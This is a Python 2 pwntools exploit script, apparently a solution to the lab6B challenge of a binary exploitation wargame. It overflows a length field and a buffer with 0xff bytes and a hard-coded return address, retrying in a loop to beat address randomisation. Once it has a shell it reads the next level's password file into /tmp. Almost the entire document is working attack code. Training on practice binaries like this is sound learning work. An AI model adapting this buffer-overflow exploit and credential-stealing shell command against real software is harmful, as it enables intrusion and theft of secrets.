#!/usr/bin/env python2

import sys
import argparse
from pwn import *

def exploit():

    msgLenOverwrite = p8(0xff) * 41
    p.sendlineafter("Enter your username\n", msgLenOverwrite)

    payload = p8(0xff) * 196
    payload += p32(0xb775d72b)
    p.sendlineafter("Tweet @Unix-Dude\n", payload)
    p.clean()
    try:
        p.sendline("ls; cat /home/lab6B/.pass > /tmp/corb3nik.dump")
        print p.recvline()
    except:
        pass


if __name__ == '__main__':

    # Argument parser
    parser = argparse.ArgumentParser(description='Exploit Dev Template')
    parser.add_argument('binary', help="Binary to exploit")
    parser.add_argument('-e', '--env', choices=['local', 'remote'],
                        help='Default : local',
                        default='local')

    parser.add_argument('-i', help="remote IP")
    parser.add_argument('-p', help="remote port")

    args = parser.parse_args()

    # Validate that an IP and port has been specified for remote env
    if args.env == "remote" and (args.i == None or args.p == None):
        print "s : missing IP and/or port" % sys.argv[0]
        exit()

    # Load the binary
    try:
        binary = ELF(args.binary)
    except:
        log.warn("Issue opening %s" % args.binary)
        exit()

    try:
        libc = binary.libc
    except:
        log.warn("Libc not loaded.")

    env = args.env
    loot = {}


    context.log_level = 'error'
    while True:
        p = process([args.binary])
        print pidof(p)
        exploit()
        p.close()
